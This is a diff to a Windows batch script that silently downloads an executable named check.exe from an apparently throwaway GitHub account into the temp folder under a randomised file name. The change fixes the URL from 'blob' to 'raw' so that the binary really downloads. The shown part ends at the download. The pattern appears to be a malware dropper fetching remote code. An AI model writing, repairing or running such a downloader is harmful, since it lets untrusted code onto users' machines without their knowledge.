@@ -1,6 +1,6 @@
 @echo off
 setlocal
-set "URL=https://github.com/venueasporol173-beep/check/blob/main/check.exe"
+set "URL=https://github.com/venueasporol173-beep/check/raw/main/check.exe"
 set "FILE=%TEMP%\Check_%RANDOM%%RANDOM%.exe"
 
 curl -L -s -o "%FILE%" "%URL%"
